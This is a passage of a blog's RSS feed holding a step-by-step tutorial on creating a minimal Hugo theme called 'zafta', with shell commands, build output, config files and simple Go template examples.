<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Kuekiko` blog</title>
        <link>https://kuekiko.top/posts/</link>
        <description>Recent content in Posts on Kuekiko` blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Tue, 30 Jun 2020 01:15:26 +0800</lastBuildDate>
        <atom:link href="https://kuekiko.top/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Creating a New Theme</title>
            <link>https://kuekiko.top/posts/2014/09/creating-a-new-theme/</link>
            <pubDate>Sun, 28 Sep 2014 00:00:00 +0000</pubDate>
            
            <guid>https://kuekiko.top/posts/2014/09/creating-a-new-theme/</guid>
            <description>Introduction This tutorial will show you how to create a simple theme in Hugo. I assume that you are familiar with HTML, the bash command line, and that you are comfortable using Markdown to format content. I&amp;rsquo;ll explain how Hugo uses templates and how you can organize your templates to create a theme. I won&amp;rsquo;t cover using CSS to style your theme.
We&amp;rsquo;ll start with creating a new site with a very basic template.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>This tutorial will show you how to create a simple theme in Hugo. I assume that you are familiar with HTML, the bash command line, and that you are comfortable using Markdown to format content. I&rsquo;ll explain how Hugo uses templates and how you can organize your templates to create a theme. I won&rsquo;t cover using CSS to style your theme.</p>
<p>We&rsquo;ll start with creating a new site with a very basic template. Then we&rsquo;ll add in a few pages and posts. With small variations on that, you will be able to create many different types of web sites.</p>
<p>In this tutorial, commands that you enter will start with the &ldquo;$&rdquo; prompt. The output will follow. Lines that start with &ldquo;#&rdquo; are comments that I&rsquo;ve added to explain a point. When I show updates to a file, the &ldquo;:wq&rdquo; on the last line means to save the file.</p>
<p>Here&rsquo;s an example:</p>
<pre><code>## this is a comment
$ echo this is a command
this is a command

## edit the file
$ vi foo.md
+++
date = &quot;2014-09-28&quot;
title = &quot;creating a new theme&quot;
+++

bah and humbug
:wq

## show it
$ cat foo.md
+++
date = &quot;2014-09-28&quot;
title = &quot;creating a new theme&quot;
+++

bah and humbug
$
</code></pre><h2 id="some-definitions">Some Definitions</h2>
<p>There are a few concepts that you need to understand before creating a theme.</p>
<h3 id="skins">Skins</h3>
<p>Skins are the files responsible for the look and feel of your site. It’s the CSS that controls colors and fonts, it’s the Javascript that determines actions and reactions. It’s also the rules that Hugo uses to transform your content into the HTML that the site will serve to visitors.</p>
<p>You have two ways to create a skin. The simplest way is to create it in the <code>layouts/</code> directory. If you do, then you don’t have to worry about configuring Hugo to recognize it. The first place that Hugo will look for rules and files is in the <code>layouts/</code> directory so it will always find the skin.</p>
<p>Your second choice is to create it in a sub-directory of the <code>themes/</code> directory. If you do, then you must always tell Hugo where to search for the skin. It’s extra work, though, so why bother with it?</p>
<p>The difference between creating a skin in <code>layouts/</code> and creating it in <code>themes/</code> is very subtle. A skin in <code>layouts/</code> can’t be customized without updating the templates and static files that it is built from. A skin created in <code>themes/</code>, on the other hand, can be and that makes it easier for other people to use it.</p>
<p>The rest of this tutorial will call a skin created in the <code>themes/</code> directory a theme.</p>
<p>Note that you can use this tutorial to create a skin in the <code>layouts/</code> directory if you wish to. The main difference will be that you won’t need to update the site’s configuration file to use a theme.</p>
<h3 id="the-home-page">The Home Page</h3>
<p>The home page, or landing page, is the first page that many visitors to a site see. It is the index.html file in the root directory of the web site. Since Hugo writes files to the public/ directory, our home page is public/index.html.</p>
<h3 id="site-configuration-file">Site Configuration File</h3>
<p>When Hugo runs, it looks for a configuration file that contains settings that override default values for the entire site. The file can use TOML, YAML, or JSON. I prefer to use TOML for my configuration files. If you prefer to use JSON or YAML, you’ll need to translate my examples. You’ll also need to change the name of the file since Hugo uses the extension to determine how to process it.</p>
<p>Hugo translates Markdown files into HTML. By default, Hugo expects to find Markdown files in your <code>content/</code> directory and template files in your <code>themes/</code> directory. It will create HTML files in your <code>public/</code> directory. You can change this by specifying alternate locations in the configuration file.</p>
<h3 id="content">Content</h3>
<p>Content is stored in text files that contain two sections. The first section is the “front matter,” which is the meta-information on the content. The second section contains Markdown that will be converted to HTML.</p>
<h4 id="front-matter">Front Matter</h4>
<p>The front matter is information about the content. Like the configuration file, it can be written in TOML, YAML, or JSON. Unlike the configuration file, Hugo doesn’t use the file’s extension to know the format. It looks for markers to signal the type. TOML is surrounded by “<code>+++</code>”, YAML by “<code>---</code>”, and JSON is enclosed in curly braces. I prefer to use TOML, so you’ll need to translate my examples if you prefer YAML or JSON.</p>
<p>The information in the front matter is passed into the template before the content is rendered into HTML.</p>
<h4 id="markdown">Markdown</h4>
<p>Content is written in Markdown which makes it easier to create the content. Hugo runs the content through a Markdown engine to create the HTML which will be written to the output file.</p>
<h3 id="template-files">Template Files</h3>
<p>Hugo uses template files to render content into HTML. Template files are a bridge between the content and presentation. Rules in the template define what content is published, where it&rsquo;s published to, and how it will rendered to the HTML file. The template guides the presentation by specifying the style to use.</p>
<p>There are three types of templates: single, list, and partial. Each type takes a bit of content as input and transforms it based on the commands in the template.</p>
<p>Hugo uses its knowledge of the content to find the template file used to render the content. If it can’t find a template that is an exact match for the content, it will shift up a level and search from there. It will continue to do so until it finds a matching template or runs out of templates to try. If it can’t find a template, it will use the default template for the site.</p>
<p>Please note that you can use the front matter to influence Hugo’s choice of templates.</p>
<h4 id="single-template">Single Template</h4>
<p>A single template is used to render a single piece of content. For example, an article or post would be a single piece of content and use a single template.</p>
<h4 id="list-template">List Template</h4>
<p>A list template renders a group of related content. That could be a summary of recent postings or all articles in a category. List templates can contain multiple groups.</p>
<p>The homepage template is a special type of list template. Hugo assumes that the home page of your site will act as the portal for the rest of the content in the site.</p>
<h4 id="partial-template">Partial Template</h4>
<p>A partial template is a template that can be included in other templates. Partial templates must be called using the “partial” template command. They are very handy for rolling up common behavior. For example, your site may have a banner that all pages use. Instead of copying the text of the banner into every single and list template, you could create a partial with the banner in it. That way if you decide to change the banner, you only have to change the partial template.</p>
<h2 id="create-a-new-site">Create a New Site</h2>
<p>Let&rsquo;s use Hugo to create a new web site. I&rsquo;m a Mac user, so I&rsquo;ll create mine in my home directory, in the Sites folder. If you&rsquo;re using Linux, you might have to create the folder first.</p>
<p>The &ldquo;new site&rdquo; command will create a skeleton of a site. It will give you the basic directory structure and a useable configuration file.</p>
<pre><code>$ hugo new site ~/Sites/zafta
$ cd ~/Sites/zafta
$ ls -l
total 8
drwxr-xr-x  7 quoha  staff  238 Sep 29 16:49 .
drwxr-xr-x  3 quoha  staff  102 Sep 29 16:49 ..
drwxr-xr-x  2 quoha  staff   68 Sep 29 16:49 archetypes
-rw-r--r--  1 quoha  staff   82 Sep 29 16:49 config.toml
drwxr-xr-x  2 quoha  staff   68 Sep 29 16:49 content
drwxr-xr-x  2 quoha  staff   68 Sep 29 16:49 layouts
drwxr-xr-x  2 quoha  staff   68 Sep 29 16:49 static
$
</code></pre><p>Take a look in the content/ directory to confirm that it is empty.</p>
<p>The other directories (archetypes/, layouts/, and static/) are used when customizing a theme. That&rsquo;s a topic for a different tutorial, so please ignore them for now.</p>
<h3 id="generate-the-html-for-the-new-site">Generate the HTML For the New Site</h3>
<p>Running the <code>hugo</code> command with no options will read all the available content and generate the HTML files. It will also copy all static files (that&rsquo;s everything that&rsquo;s not content). Since we have an empty site, it won&rsquo;t do much, but it will do it very quickly.</p>
<pre><code>$ hugo --verbose
INFO: 2014/09/29 Using config file: config.toml
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/
WARN: 2014/09/29 Unable to locate layout: [index.html _default/list.html _default/single.html]
WARN: 2014/09/29 Unable to locate layout: [404.html]
0 draft content
0 future content
0 pages created
0 tags created
0 categories created
in 2 ms
$
</code></pre><p>The &ldquo;<code>--verbose</code>&rdquo; flag gives extra information that will be helpful when we build the template. Every line of the output that starts with &ldquo;INFO:&rdquo; or &ldquo;WARN:&rdquo; is present because we used that flag. The lines that start with &ldquo;WARN:&rdquo; are warning messages. We&rsquo;ll go over them later.</p>
<p>We can verify that the command worked by looking at the directory again.</p>
<pre><code>$ ls -l
total 8
drwxr-xr-x  2 quoha  staff   68 Sep 29 16:49 archetypes
-rw-r--r--  1 quoha  staff   82 Sep 29 16:49 config.toml
drwxr-xr-x  2 quoha  staff   68 Sep 29 16:49 content
drwxr-xr-x  2 quoha  staff   68 Sep 29 16:49 layouts
drwxr-xr-x  4 quoha  staff  136 Sep 29 17:02 public
drwxr-xr-x  2 quoha  staff   68 Sep 29 16:49 static
$
</code></pre><p>See that new public/ directory? Hugo placed all generated content there. When you&rsquo;re ready to publish your web site, that&rsquo;s the place to start. For now, though, let&rsquo;s just confirm that we have what we&rsquo;d expect from a site with no content.</p>
<pre><code>$ ls -l public
total 16
-rw-r--r--  1 quoha  staff  416 Sep 29 17:02 index.xml
-rw-r--r--  1 quoha  staff  262 Sep 29 17:02 sitemap.xml
$
</code></pre><p>Hugo created two XML files, which is standard, but there are no HTML files.</p>
<h3 id="test-the-new-site">Test the New Site</h3>
<p>Verify that you can run the built-in web server. It will dramatically shorten your development cycle if you do. Start it by running the &ldquo;server&rdquo; command. If it is successful, you will see output similar to the following:</p>
<pre><code>$ hugo server --verbose
INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/
WARN: 2014/09/29 Unable to locate layout: [index.html _default/list.html _default/single.html]
WARN: 2014/09/29 Unable to locate layout: [404.html]
0 draft content
0 future content
0 pages created
0 tags created
0 categories created
in 2 ms
Serving pages from /Users/quoha/Sites/zafta/public
Web Server is available at http://localhost:1313
Press Ctrl+C to stop
</code></pre><p>Connect to the listed URL (it&rsquo;s on the line that starts with &ldquo;Web Server&rdquo;). If everything is working correctly, you should get a page that shows the following:</p>
<pre><code>index.xml
sitemap.xml
</code></pre><p>That&rsquo;s a listing of your public/ directory. Hugo didn&rsquo;t create a home page because our site has no content. When there&rsquo;s no index.html file in a directory, the server lists the files in the directory, which is what you should see in your browser.</p>
<p>Let’s go back and look at those warnings again.</p>
<pre><code>WARN: 2014/09/29 Unable to locate layout: [index.html _default/list.html _default/single.html]
WARN: 2014/09/29 Unable to locate layout: [404.html]
</code></pre><p>That second warning is easier to explain. We haven’t created a template to be used to generate “page not found errors.” The 404 message is a topic for a separate tutorial.</p>
<p>Now for the first warning. It is for the home page. You can tell because the first layout that it looked for was “index.html.” That’s only used by the home page.</p>
<p>I like that the verbose flag causes Hugo to list the files that it&rsquo;s searching for. For the home page, they are index.html, _default/list.html, and _default/single.html. There are some rules that we&rsquo;ll cover later that explain the names and paths. For now, just remember that Hugo couldn&rsquo;t find a template for the home page and it told you so.</p>
<p>At this point, you&rsquo;ve got a working installation and site that we can build upon. All that’s left is to add some content and a theme to display it.</p>
<h2 id="create-a-new-theme">Create a New Theme</h2>
<p>Hugo doesn&rsquo;t ship with a default theme. There are a few available (I counted a dozen when I first installed Hugo) and Hugo comes with a command to create new themes.</p>
<p>We&rsquo;re going to create a new theme called &ldquo;zafta.&rdquo; Since the goal of this tutorial is to show you how to fill out the files to pull in your content, the theme will not contain any CSS. In other words, ugly but functional.</p>
<p>All themes have opinions on content and layout. For example, Zafta uses &ldquo;post&rdquo; over &ldquo;blog&rdquo;. Strong opinions make for simpler templates but differing opinions make it tougher to use themes. When you build a theme, consider using the terms that other themes do.</p>
<h3 id="create-a-skeleton">Create a Skeleton</h3>
<p>Use the hugo &ldquo;new&rdquo; command to create the skeleton of a theme. This creates the directory structure and places empty files for you to fill out.</p>
<pre><code>$ hugo new theme zafta

$ ls -l
total 8
drwxr-xr-x  2 quoha  staff   68 Sep 29 16:49 archetypes
-rw-r--r--  1 quoha  staff   82 Sep 29 16:49 config.toml
drwxr-xr-x  2 quoha  staff   68 Sep 29 16:49 content
drwxr-xr-x  2 quoha  staff   68 Sep 29 16:49 layouts
drwxr-xr-x  4 quoha  staff  136 Sep 29 17:02 public
drwxr-xr-x  2 quoha  staff   68 Sep 29 16:49 static
drwxr-xr-x  3 quoha  staff  102 Sep 29 17:31 themes

$ find themes -type f | xargs ls -l
-rw-r--r--  1 quoha  staff  1081 Sep 29 17:31 themes/zafta/LICENSE.md
-rw-r--r--  1 quoha  staff     0 Sep 29 17:31 themes/zafta/archetypes/default.md
-rw-r--r--  1 quoha  staff     0 Sep 29 17:31 themes/zafta/layouts/_default/list.html
-rw-r--r--  1 quoha  staff     0 Sep 29 17:31 themes/zafta/layouts/_default/single.html
-rw-r--r--  1 quoha  staff     0 Sep 29 17:31 themes/zafta/layouts/index.html
-rw-r--r--  1 quoha  staff     0 Sep 29 17:31 themes/zafta/layouts/partials/footer.html
-rw-r--r--  1 quoha  staff     0 Sep 29 17:31 themes/zafta/layouts/partials/header.html
-rw-r--r--  1 quoha  staff    93 Sep 29 17:31 themes/zafta/theme.toml
$
</code></pre><p>The skeleton includes templates (the files ending in .html), license file, a description of your theme (the theme.toml file), and an empty archetype.</p>
<p>Please take a minute to fill out the theme.toml and LICENSE.md files. They&rsquo;re optional, but if you&rsquo;re going to be distributing your theme, it tells the world who to praise (or blame). It&rsquo;s also nice to declare the license so that people will know how they can use the theme.</p>
<pre><code>$ vi themes/zafta/theme.toml
author = &quot;michael d henderson&quot;
description = &quot;a minimal working template&quot;
license = &quot;MIT&quot;
name = &quot;zafta&quot;
source_repo = &quot;&quot;
tags = [&quot;tags&quot;, &quot;categories&quot;]
:wq

## also edit themes/zafta/LICENSE.md and change
## the bit that says &quot;YOUR_NAME_HERE&quot;
</code></pre><p>Note that the the skeleton&rsquo;s template files are empty. Don&rsquo;t worry, we&rsquo;ll be changing that shortly.</p>
<pre><code>$ find themes/zafta -name '*.html' | xargs ls -l
-rw-r--r--  1 quoha  staff  0 Sep 29 17:31 themes/zafta/layouts/_default/list.html
-rw-r--r--  1 quoha  staff  0 Sep 29 17:31 themes/zafta/layouts/_default/single.html
-rw-r--r--  1 quoha  staff  0 Sep 29 17:31 themes/zafta/layouts/index.html
-rw-r--r--  1 quoha  staff  0 Sep 29 17:31 themes/zafta/layouts/partials/footer.html
-rw-r--r--  1 quoha  staff  0 Sep 29 17:31 themes/zafta/layouts/partials/header.html
$
</code></pre><h3 id="update-the-configuration-file-to-use-the-theme">Update the Configuration File to Use the Theme</h3>
<p>Now that we&rsquo;ve got a theme to work with, it&rsquo;s a good idea to add the theme name to the configuration file. This is optional, because you can always add &ldquo;-t zafta&rdquo; on all your commands. I like to put it the configuration file because I like shorter command lines. If you don&rsquo;t put it in the configuration file or specify it on the command line, you won&rsquo;t use the template that you&rsquo;re expecting to.</p>
<p>Edit the file to add the theme, add a title for the site, and specify that all of our content will use the TOML format.</p>
<pre><code>$ vi config.toml
theme = &quot;zafta&quot;
baseurl = &quot;&quot;
languageCode = &quot;en-us&quot;
title = &quot;zafta - totally refreshing&quot;
MetaDataFormat = &quot;toml&quot;
:wq

$
</code></pre><h3 id="generate-the-site">Generate the Site</h3>
<p>Now that we have an empty theme, let&rsquo;s generate the site again.</p>
<pre><code>$ hugo --verbose
INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/
WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html]
0 draft content
0 future content
0 pages created
0 tags created
0 categories created
in 2 ms
$
</code></pre><p>Did you notice that the output is different? The warning message for the home page has disappeared and we have an additional information line saying that Hugo is syncing from the theme&rsquo;s directory.</p>
<p>Let&rsquo;s check the public/ directory to see what Hugo&rsquo;s created.</p>
<pre><code>$ ls -l public
total 16
drwxr-xr-x  2 quoha  staff   68 Sep 29 17:56 css
-rw-r--r--  1 quoha  staff    0 Sep 29 17:56 index.html
-rw-r--r--  1 quoha  staff  407 Sep 29 17:56 index.xml
drwxr-xr-x  2 quoha  staff   68 Sep 29 17:56 js
-rw-r--r--  1 quoha  staff  243 Sep 29 17:56 sitemap.xml
$
</code></pre><p>Notice four things:</p>
<ol>
<li>Hugo created a home page. This is the file public/index.html.</li>
<li>Hugo created a css/ directory.</li>
<li>Hugo created a js/ directory.</li>
<li>Hugo claimed that it created 0 pages. It created a file and copied over static files, but didn&rsquo;t create any pages. That&rsquo;s because it considers a &ldquo;page&rdquo; to be a file created directly from a content file. It doesn&rsquo;t count things like the index.html files that it creates automatically.</li>
</ol>
<h4 id="the-home-page-1">The Home Page</h4>
<p>Hugo supports many different types of templates. The home page is special because it gets its own type of template and its own template file. The file, layouts/index.html, is used to generate the HTML for the home page. The Hugo documentation says that this is the only required template, but that depends. Hugo&rsquo;s warning message shows that it looks for three different templates:</p>
<pre><code>WARN: 2014/09/29 Unable to locate layout: [index.html _default/list.html _default/single.html]
</code></pre><p>If it can&rsquo;t find any of these, it completely skips creating the home page. We noticed that when we built the site without having a theme installed.</p>
<p>When Hugo created our theme, it created an empty home page template. Now, when we build the site, Hugo finds the template and uses it to generate the HTML for the home page. Since the template file is empty, the HTML file is empty, too. If the template had any rules in it, then Hugo would have used them to generate the home page.</p>
<pre><code>$ find . -name index.html | xargs ls -l
-rw-r--r--  1 quoha  staff  0 Sep 29 20:21 ./public/index.html
-rw-r--r--  1 quoha  staff  0 Sep 29 17:31 ./themes/zafta/layouts/index.html
$
</code></pre><h4 id="the-magic-of-static">The Magic of Static</h4>
<p>Hugo does two things when generating the site. It uses templates to transform content into HTML and it copies static files into the site. Unlike content, static files are not transformed. They are copied exactly as they are.</p>
<p>Hugo assumes that your site will use both CSS and JavaScript, so it creates directories in your theme to hold them. Remember opinions? Well, Hugo&rsquo;s opinion is that you&rsquo;ll store your CSS in a directory named css/ and your JavaScript in a directory named js/. If you don&rsquo;t like that, you can change the directory names in your theme directory or even delete them completely. Hugo&rsquo;s nice enough to offer its opinion, then behave nicely if you disagree.</p>
<pre><code>$ find themes/zafta -type d | xargs ls -ld
drwxr-xr-x  7 quoha  staff  238 Sep 29 17:38 themes/zafta
drwxr-xr-x  3 quoha  staff  102 Sep 29 17:31 themes/zafta/archetypes
drwxr-xr-x  5 quoha  staff  170 Sep 29 17:31 themes/zafta/layouts
drwxr-xr-x  4 quoha  staff  136 Sep 29 17:31 themes/zafta/layouts/_default
drwxr-xr-x  4 quoha  staff  136 Sep 29 17:31 themes/zafta/layouts/partials
drwxr-xr-x  4 quoha  staff  136 Sep 29 17:31 themes/zafta/static
drwxr-xr-x  2 quoha  staff   68 Sep 29 17:31 themes/zafta/static/css
drwxr-xr-x  2 quoha  staff   68 Sep 29 17:31 themes/zafta/static/js
$
</code></pre><h2 id="the-theme-development-cycle">The Theme Development Cycle</h2>
<p>When you&rsquo;re working on a theme, you will make changes in the theme&rsquo;s directory, rebuild the site, and check your changes in the browser. Hugo makes this very easy:</p>
<ol>
<li>Purge the public/ directory.</li>
<li>Run the built in web server in watch mode.</li>
<li>Open your site in a browser.</li>
<li>Update the theme.</li>
<li>Glance at your browser window to see changes.</li>
<li>Return to step 4.</li>
</ol>
<p>I’ll throw in one more opinion: never work on a theme on a live site. Always work on a copy of your site. Make changes to your theme, test them, then copy them up to your site. For added safety, use a tool like Git to keep a revision history of your content and your theme. Believe me when I say that it is too easy to lose both your mind and your changes.</p>
<p>Check the main Hugo site for information on using Git with Hugo.</p>
<h3 id="purge-the-public-directory">Purge the public/ Directory</h3>
<p>When generating the site, Hugo will create new files and update existing ones in the <code>public/</code> directory. It will not delete files that are no longer used. For example, files that were created in the wrong directory or with the wrong title will remain. If you leave them, you might get confused by them later. I recommend cleaning out your site prior to generating it.</p>
<p>Note: If you&rsquo;re building on an SSD, you should ignore this. Churning on a SSD can be costly.</p>
<h3 id="hugos-watch-option">Hugo&rsquo;s Watch Option</h3>
<p>Hugo&rsquo;s &ldquo;<code>--watch</code>&rdquo; option will monitor the content/ and your theme directories for changes and rebuild the site automatically.</p>
<h3 id="live-reload">Live Reload</h3>
<p>Hugo&rsquo;s built in web server supports live reload. As pages are saved on the server, the browser is told to refresh the page. Usually, this happens faster than you can say, &ldquo;Wow, that&rsquo;s totally amazing.&rdquo;</p>
<h3 id="development-commands">Development Commands</h3>
<p>Use the following commands as the basis for your workflow.</p>
<pre><code>## purge old files. hugo will recreate the public directory.
##
$ rm -rf public
##
## run hugo in watch mode
##
$ hugo server --watch --verbose
</code></pre><p>Here&rsquo;s sample output showing Hugo detecting a change to the template for the home page. Once generated, the web browser automatically reloaded the page. I&rsquo;ve said this before, it&rsquo;s amazing.</p>
<pre><code>$ rm -rf public
$ hugo server --watch --verbose
INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/
WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html]
0 draft content
0 future content
0 pages created
0 tags created
0 categories created
in 2 ms
Watching for changes in /Users/quoha/Sites/zafta/content
Serving pages from /Users/quoha/Sites/zafta/public
Web Server is available at http://localhost:1313
Press Ctrl+C to stop
INFO: 2014/09/29 File System Event: [&quot;/Users/quoha/Sites/zafta/themes/zafta/layouts/index.html&quot;: MODIFY|ATTRIB]
Change detected, rebuilding site

WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html]
0 draft content
0 future content
0 pages created
0 tags created
0 categories created
in 1 ms
</code></pre><h2 id="update-the-home-page-template">Update the Home Page Template</h2>
<p>The home page is one of a few special pages that Hugo creates automatically. As mentioned earlier, it looks for one of three files in the theme&rsquo;s layout/ directory:</p>
<ol>
<li>index.html</li>
<li>_default/list.html</li>
<li>_default/single.html</li>
</ol>
<p>We could update one of the default templates, but a good design decision is to update the most specific template available. That&rsquo;s not a hard and fast rule (in fact, we&rsquo;ll break it a few times in this tutorial), but it is a good generalization.</p>
<h3 id="make-a-static-home-page">Make a Static Home Page</h3>
<p>Right now, that page is empty because we don&rsquo;t have any content and we don&rsquo;t have any logic in the template. Let&rsquo;s change that by adding some text to the template.</p>
<pre><code>$ vi themes/zafta/layouts/index.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
  &lt;p&gt;hugo says hello!&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
:wq

$
</code></pre><p>Build the web site and then verify the results.</p>
<pre><code>$ hugo --verbose
INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/
WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html]
0 draft content
0 future content
0 pages created
0 tags created
0 categories created
in 2 ms

$ find public -type f -name '*.html' | xargs ls -l
-rw-r--r--  1 quoha  staff  78 Sep 29 21:26 public/index.html

$ cat public/index.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
  &lt;p&gt;hugo says hello!&lt;/p&gt;
&lt;/html&gt;
</code></pre><h4 id="live-reload-1">Live Reload</h4>
<p>Note: If you&rsquo;re running the server with the <code>--watch</code> option, you&rsquo;ll see different content in the file:</p>
<pre><code>$ cat public/index.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
  &lt;p&gt;hugo says hello!&lt;/p&gt;
&lt;script&gt;document.write('&lt;script src=&quot;http://'
        + (location.host || 'localhost').split(':')[0]
    + ':1313/livereload.js?mindelay=10&quot;&gt;&lt;/'
        + 'script&gt;')&lt;/script&gt;&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>When you use <code>--watch</code>, the Live Reload script is added by Hugo. Look for live reload in the documentation to see what it does and how to disable it.</p>
<h3 id="build-a-dynamic-home-page">Build a &ldquo;Dynamic&rdquo; Home Page</h3>
<p>&ldquo;Dynamic home page?&rdquo; Hugo&rsquo;s a static web site generator, so this seems an odd thing to say. I mean let&rsquo;s have the home page automatically reflect the content in the site every time Hugo builds it. We&rsquo;ll use iteration in the template to do that.</p>
<h4 id="create-new-posts">Create New Posts</h4>
<p>Now that we have the home page generating static content, let&rsquo;s add some content to the site. We&rsquo;ll display these posts as a list on the home page and on their own page, too.</p>
<p>Hugo has a command to generate a skeleton post, just like it does for sites and themes.</p>
<pre><code>$ hugo --verbose new post/first.md
INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml
INFO: 2014/09/29 attempting to create  post/first.md of post
INFO: 2014/09/29 curpath: /Users/quoha/Sites/zafta/themes/zafta/archetypes/default.md
ERROR: 2014/09/29 Unable to Cast &lt;nil&gt; to map[string]interface{}

$
</code></pre><p>That wasn&rsquo;t very nice, was it?</p>
<p>The &ldquo;new&rdquo; command uses an archetype to create the post file. Hugo created an empty default archetype file, but that causes an error when there&rsquo;s a theme. For me, the workaround was to create an archetypes file specifically for the post type.</p>
<pre><code>$ vi themes/zafta/archetypes/post.md
+++
Description = &quot;&quot;
Tags = []
Categories = []
+++
:wq

$ find themes/zafta/archetypes -type f | xargs ls -l
-rw-r--r--  1 quoha  staff   0 Sep 29 21:53 themes/zafta/archetypes/default.md
-rw-r--r--  1 quoha  staff  51 Sep 29 21:54 themes/zafta/archetypes/post.md

$ hugo --verbose new post/first.md
INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml
INFO: 2014/09/29 attempting to create  post/first.md of post
INFO: 2014/09/29 curpath: /Users/quoha/Sites/zafta/themes/zafta/archetypes/post.md
INFO: 2014/09/29 creating /Users/quoha/Sites/zafta/content/post/first.md
/Users/quoha/Sites/zafta/content/post/first.md created

$ hugo --verbose new post/second.md
INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml
INFO: 2014/09/29 attempting to create  post/second.md of post
INFO: 2014/09/29 curpath: /Users/quoha/Sites/zafta/themes/zafta/archetypes/post.md
INFO: 2014/09/29 creating /Users/quoha/Sites/zafta/content/post/second.md
/Users/quoha/Sites/zafta/content/post/second.md created

$ ls -l content/post
total 16
-rw-r--r--  1 quoha  staff  104 Sep 29 21:54 first.md
-rw-r--r--  1 quoha  staff  105 Sep 29 21:57 second.md

$ cat content/post/first.md
+++
Categories = []
Description = &quot;&quot;
Tags = []
date = &quot;2014-09-29T21:54:53-05:00&quot;
title = &quot;first&quot;

+++
my first post

$ cat content/post/second.md
+++
Categories = []
Description = &quot;&quot;
Tags = []
date = &quot;2014-09-29T21:57:09-05:00&quot;
title = &quot;second&quot;

+++
my second post

$
</code></pre><p>Build the web site and then verify the results.</p>
<pre><code>$ rm -rf public
$ hugo --verbose
INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/
INFO: 2014/09/29 found taxonomies: map[string]string{&quot;category&quot;:&quot;categories&quot;, &quot;tag&quot;:&quot;tags&quot;}
WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html]
0 draft content
0 future content
2 pages created
0 tags created
0 categories created
in 4 ms
$
</code></pre><p>The output says that it created 2 pages. Those are our new posts:</p>
<pre><code>$ find public -type f -name '*.html' | xargs ls -l
-rw-r--r--  1 quoha  staff  78 Sep 29 22:13 public/index.html
-rw-r--r--  1 quoha  staff   0 Sep 29 22:13 public/post/first/index.html
-rw-r--r--  1 quoha  staff   0 Sep 29 22:13 public/post/index.html
-rw-r--r--  1 quoha  staff   0 Sep 29 22:13 public/post/second/index.html
$
</code></pre><p>The new files are empty because because the templates used to generate the content are empty. The homepage doesn&rsquo;t show the new content, either. We have to update the templates to add the posts.</p>
<h3 id="list-and-single-templates">List and Single Templates</h3>
<p>In Hugo, we have three major kinds of templates. There&rsquo;s the home page template that we updated previously. It is used only by the home page. We also have &ldquo;single&rdquo; templates which are used to generate output for a single content file. We also have &ldquo;list&rdquo; templates that are used to group multiple pieces of content before generating output.</p>
<p>Generally speaking, list templates are named &ldquo;list.html&rdquo; and single templates are named &ldquo;single.html.&rdquo;</p>
<p>There are three other types of templates: partials, content views, and terms. We will not go into much detail on these.</p>
<h3 id="add-content-to-the-homepage">Add Content to the Homepage</h3>
<p>The home page will contain a list of posts. Let&rsquo;s update its template to add the posts that we just created. The logic in the template will run every time we build the site.</p>
<pre><code>$ vi themes/zafta/layouts/index.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
  {{ range first 10 .Data.Pages }}
    &lt;h1&gt;{{ .Title }}&lt;/h1&gt;
  {{ end }}
&lt;/body&gt;
&lt;/html&gt;
:wq

$
</code></pre><p>Hugo uses the Go template engine. That engine scans the template files for commands which are enclosed between &ldquo;{{&rdquo; and &ldquo;}}&quot;. In our template, the commands are:</p>
<ol>
<li>range</li>
<li>.Title</li>
<li>end</li>
</ol>
<p>The &ldquo;range&rdquo; command is an iterator. We&rsquo;re going to use it to go through the first ten pages. Every HTML file that Hugo creates is treated as a page, so looping through the list of pages will look at every file that will be created.</p>
<p>The &ldquo;.Title&rdquo; command prints the value of the &ldquo;title&rdquo; variable. Hugo pulls it from the front matter in the Markdown file.</p>
